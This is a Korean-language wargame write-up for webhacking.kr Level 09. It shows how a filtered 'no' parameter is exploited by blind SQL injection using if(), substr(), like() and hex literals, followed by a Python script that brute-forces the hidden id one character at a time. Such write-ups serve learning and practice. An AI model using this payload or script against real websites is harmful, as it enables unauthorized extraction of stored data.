---
title: "[Web.kr]Level 09"
tags: [Wargame, webhacking.kr(Old), Write-up]
article_header:
  type: cover
  image:
    src: 
---

<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 09/image-20180731082324421.png" width="300px">

숫자 버튼이 1~3 까지 있고, 패스워드 입력 창이 보인다.



<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 09/image-20180731082413982.png" width="400px">

1번을 누르면 "Apple"이 보여지고, no값이 1이 된다.



<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 09/image-20180731082513664.png" width="400px">

2번은 "Banana" 이다.



<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 09/image-20180731082600076.png" width="400px">

3번은 "Secret" 이라고 나오면, 힌트들이 보여진다.



길이는 11자리이며, 컴럼에는 'id'와 'no' 가 있다고 나와있다. 

일단 no에 값에 따라서 나오는 문자열들이 id값이라고 추측해볼 수 있다.



우리가 넣을 수 있는 input값은 no 파라미터이다.

즉, no파라미터를 조작하여 no=3의 id를 알아내면 될 것같다. 



일단, "Apple", "Banana"가 id값이 맞는지 테스트해 보았다.



<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 09/image-20180731083925332.png" width="400px">

위와 같은 쿼리문으로 id값이 맞는지 확인해 보려고 했으나, (') 문자 필터링 되어 있었다.

그래서 필터링 되는 문자들을 몇개 찾아보니 '%'와 '='를 필터링 한다, 즉, 공백(%20), 개행(%0a) 등... 모두 필터링 된다.😫



조건문들을 통해 비교하면 좋을 것 같았다.

먼저 조건의 결과 값으로 파싱해야 될 것 같아서 if문을 사용하였다.

<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 09/image-20180731091757513.png" width="500px">

> if(조건문, '참'일때, '거짓'일때)

이유는 파싱할 때 페이지의 소스값으로 파싱해야 되는데, no값에 따라서 페이지상에 문자들이 변경되기 때문이다.





<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 09/image-20180731085613262.png" width="500px">



위 사진을 살펴보면, id를 조회하면서 id가 'Apple'이면 no값이 1이되고, 아니면 0이된다.

거짓의 값을 '0'으로 한 이유는 if문이 만약 실제 존재하는 no값으로 하게되면, 둘다 출력이 되기 때문이다.





이제 싱글쿼터(')를 없애는 방법을 찾아야 한다.

문자열을 비교하면서 싱글쿼터를 사용하지 않는 방법 찾다가 substr()함수를 찾았다. 아래는 예시이다.

<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 09/image-20180731091956224.png" width="500px">

> substr(파라미터, 오프셋, 크기)





<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 09/image-20180731091104531.png" width="500px">

id의 1번째 값부터 1글자가 'A'(0x41) 인지 확인한다.



이제  `=` 를 없애야 한다. '='과 같은건? like!



따라서 공격쿼리는 다음과 같다. `if(substr(id,1,1)like(0x41),3,0)` 



<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 09/image-20180731123115742.png" width="500px">

정상적으로 잘 동작한다.

<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 09/image-20180731125505354.png" width="500px">

여기서 확인할 점이 있다. if분의 true부분이 무엇이냐에 따라서 결과값이 달라진다.

위 사진에서 3개의 명령쿼리가 있는데 차이점에 따른 결과를 잘 살펴보고 넘어가자.



이제 이를 이용하여 id값을 찾아야 하기 때문에 자동화스크립트를 만들자.

```python
from urllib2 import *
import urllib2, re, string


SESSION = "2b34290ec5cdc07d83045e392176a118"
password = ""

code = string.ascii_letters
for i in range(1,12):
    for j in code:
        search = "if(substr(id,"+str(i)+",1)like("+hex(ord(j))+"),3,0)"
        req = urllib2.Request("http://webhacking.kr/challenge/web/web-09/?no="+search)
        req.add_header("Cookie","PHPSESSID=%s" %SESSION)
        res = urllib2.urlopen(req).read()

        print "Parsing : ?no=%s" % search

        if "Secret" in res:
            password += j
            print "[+] Find password : %s" % password
            break;
print "[*] Parsing Finish! Password : %s" % password
```



<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 09/image-20180731143333354.png" width="500px">



이제 찾은 id값을 넣어주자.

<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 09/image-20180731143630522.png" width="300px">



<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 09/image-20180731143521309.png" width="400px">



